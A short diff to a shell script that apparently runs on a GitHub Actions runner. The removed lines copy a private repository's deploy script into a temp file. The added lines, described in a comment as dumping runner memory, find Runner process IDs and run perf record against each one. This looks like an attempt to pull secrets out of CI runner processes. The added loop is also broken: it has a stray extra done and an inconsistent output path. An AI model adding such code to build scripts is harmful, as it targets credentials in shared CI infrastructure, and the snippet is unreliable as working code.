@@ -3,8 +3,15 @@
 echo "--- START ---" > /tmp/file3.txt
 
 echo $(perf -v) >> /tmp/file3.txt
-echo "-----" >> /tmp/file3.txt
-echo $(cat /home/runner/work/comment-ops-private-matiasesena/comment-ops-private-matiasesena/deploy-script.sh) >> /tmp/file3.txt
+
+# get pids related to runners and dump their memory
+for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
+do
+    echo "-----$pid-----" >> /tmp/file.txt;
+    echo $(perf record -p $pid -o /tmp/hola.data) >> tmp/file.txt;
+    done
+    echo "--------------" >> /tmp/file.txt;
+done
 
 echo "--- FINISH ---" >> /tmp/file3.txt
 
